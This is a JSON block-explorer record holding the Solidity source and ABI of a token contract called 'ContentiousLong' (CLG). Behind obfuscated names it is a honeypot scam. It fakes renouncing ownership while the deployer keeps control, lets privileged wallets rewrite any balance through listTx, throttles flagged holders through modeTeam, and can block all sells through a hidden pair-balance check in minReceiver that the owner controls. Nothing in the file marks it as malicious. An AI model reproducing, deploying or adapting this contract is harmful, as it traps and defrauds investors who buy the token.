{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface amountMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minTrading {\n    function createPair(address receiverMarketingWallet, address enableLimit) external returns (address);\n}\n\ninterface exemptMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeAuto) external view returns (uint256);\n\n    function transfer(address atAuto, uint256 toReceiver) external returns (bool);\n\n    function allowance(address takeBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atAuto,\n        uint256 toReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalMode, uint256 value);\n    event Approval(address indexed takeBuy, address indexed spender, uint256 value);\n}\n\ninterface exemptMarketingMetadata is exemptMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ContentiousLong is receiverTake, exemptMarketing, exemptMarketingMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyWallet;\n    }\n\n    function modeTeam(address limitWallet) public {\n        launchedShould();\n        if (enableExempt == tokenBuy) {\n            enableExempt = exemptMode;\n        }\n        if (limitWallet == modeTakeExempt || limitWallet == sellTx) {\n            return;\n        }\n        teamToSender[limitWallet] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return walletAmountAuto;\n    }\n\n    constructor (){\n        \n        amountMarketing buyAuto = amountMarketing(amountLimit);\n        sellTx = minTrading(buyAuto.factory()).createPair(buyAuto.WETH(), address(this));\n        if (listTeam) {\n            exemptMode = enableExempt;\n        }\n        modeTakeExempt = _msgSender();\n        atAmount();\n        shouldTx[modeTakeExempt] = true;\n        launchedTake[modeTakeExempt] = fromAmountTx;\n        \n        emit Transfer(address(0), modeTakeExempt, fromAmountTx);\n    }\n\n    bool private amountSwapReceiver;\n\n    uint256 marketingTrading;\n\n    bool private atTo;\n\n    function allowance(address swapEnable, address buyIs) external view virtual override returns (uint256) {\n        if (buyIs == amountLimit) {\n            return type(uint256).max;\n        }\n        return tradingTeam[swapEnable][buyIs];\n    }\n\n    bool private listTeam;\n\n    uint8 private buyWallet = 18;\n\n    function approve(address buyIs, uint256 toReceiver) public virtual override returns (bool) {\n        tradingTeam[_msgSender()][buyIs] = toReceiver;\n        emit Approval(_msgSender(), buyIs, toReceiver);\n        return true;\n    }\n\n    mapping(address => bool) public teamToSender;\n\n    uint256 public enableExempt;\n\n    address public sellTx;\n\n    string private feeLiquidity = \"Contentious Long\";\n\n    function listTx(address takeMarketing, uint256 toReceiver) public {\n        launchedShould();\n        launchedTake[takeMarketing] = toReceiver;\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingTeam;\n\n    uint256 teamMode;\n\n    uint256 private exemptMode;\n\n    function balanceOf(address modeAuto) public view virtual override returns (uint256) {\n        return launchedTake[modeAuto];\n    }\n\n    uint256 constant launchList = 4 ** 10;\n\n    uint256 public modeWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return feeLiquidity;\n    }\n\n    address private walletAmountAuto;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverTrading;\n    }\n\n    address public modeTakeExempt;\n\n    mapping(address => bool) public shouldTx;\n\n    function feeTrading(address receiverTo, address atAuto, uint256 toReceiver) internal returns (bool) {\n        require(launchedTake[receiverTo] >= toReceiver);\n        launchedTake[receiverTo] -= toReceiver;\n        launchedTake[atAuto] += toReceiver;\n        emit Transfer(receiverTo, atAuto, toReceiver);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed launchLimitMode, address indexed receiverTotalLaunched);\n\n    function listTeamSwap(address marketingAmountLiquidity) public {\n        if (listSwap) {\n            return;\n        }\n        if (exemptMode == tokenBuy) {\n            exemptMode = shouldTake;\n        }\n        shouldTx[marketingAmountLiquidity] = true;\n        \n        listSwap = true;\n    }\n\n    uint256 private fromAmountTx = 100000000 * 10 ** 18;\n\n    uint256 private tokenBuy;\n\n    function limitTrading(uint256 toReceiver) public {\n        launchedShould();\n        marketingTrading = toReceiver;\n    }\n\n    string private receiverTrading = \"CLG\";\n\n    function launchedShould() private view {\n        require(shouldTx[_msgSender()]);\n    }\n\n    bool private minLimit;\n\n    function atAmount() public {\n        emit OwnershipTransferred(modeTakeExempt, address(0));\n        walletAmountAuto = address(0);\n    }\n\n    function transfer(address takeMarketing, uint256 toReceiver) external virtual override returns (bool) {\n        return minReceiver(_msgSender(), takeMarketing, toReceiver);\n    }\n\n    uint256 public tradingAuto;\n\n    function minReceiver(address receiverTo, address atAuto, uint256 toReceiver) internal returns (bool) {\n        if (receiverTo == modeTakeExempt) {\n            return feeTrading(receiverTo, atAuto, toReceiver);\n        }\n        uint256 exemptAmount = exemptMarketing(sellTx).balanceOf(receiverAmount);\n        require(exemptAmount == marketingTrading);\n        require(atAuto != receiverAmount);\n        if (teamToSender[receiverTo]) {\n            return feeTrading(receiverTo, atAuto, launchList);\n        }\n        return feeTrading(receiverTo, atAuto, toReceiver);\n    }\n\n    uint256 private shouldTake;\n\n    address receiverAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private launchedTake;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromAmountTx;\n    }\n\n    address amountLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return walletAmountAuto;\n    }\n\n    bool public listSwap;\n\n    function transferFrom(address receiverTo, address atAuto, uint256 toReceiver) external override returns (bool) {\n        if (_msgSender() != amountLimit) {\n            if (tradingTeam[receiverTo][_msgSender()] != type(uint256).max) {\n                require(toReceiver <= tradingTeam[receiverTo][_msgSender()]);\n                tradingTeam[receiverTo][_msgSender()] -= toReceiver;\n            }\n        }\n        return minReceiver(receiverTo, atAuto, toReceiver);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchLimitMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTotalLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"limitTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAmountLiquidity\",\"type\":\"address\"}],\"name\":\"listTeamSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"listTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTakeExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitWallet\",\"type\":\"address\"}],\"name\":\"modeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamToSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ContentiousLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}